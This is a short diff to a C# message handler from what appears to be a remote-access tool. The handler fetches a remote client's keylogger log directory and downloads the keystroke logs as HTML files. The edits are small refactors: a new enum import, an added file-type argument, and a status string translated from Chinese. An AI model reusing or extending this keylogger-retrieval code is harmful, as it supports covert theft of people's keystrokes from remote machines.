@@ -1,4 +1,5 @@
-﻿using Rouzzf.Common.Helpers;
+﻿using Rouzzf.Common.Enums;
+using Rouzzf.Common.Helpers;
 using Rouzzf.Common.Messages;
 using Rouzzf.Common.Models;
 using Rouzzf.Common.Networking;
@@ -81,7 +82,7 @@ namespace Rouzzf.Server.Messages
         private void Execute(ISender client, GetKeyloggerLogsDirectoryResponse message)
         {
             _remoteKeyloggerDirectory = message.LogsDirectory;
-            client.Send(new GetDirectory { RemotePath = _remoteKeyloggerDirectory });
+            client.Send(new GetDirectory {RemotePath = _remoteKeyloggerDirectory});
         }
 
         private string GetDownloadProgress(int allTransfers, int completedTransfers)
@@ -118,13 +119,13 @@ namespace Rouzzf.Server.Messages
                     return;
                 }
 
-                _fileManagerHandler.BeginDownloadFile(Path.Combine(_remoteKeyloggerDirectory, item.Name), item.Name + ".html", true);
+                _fileManagerHandler.BeginDownloadFile(Path.Combine(_remoteKeyloggerDirectory, item.Name),FileType.File, item.Name + ".html", true);
             }
         }
 
         private void FileTransferUpdated(object sender, FileTransfer transfer)
         {
-            if (transfer.Status == "完成")
+            if (transfer.Status == "Completed")
             {
                 try
                 {
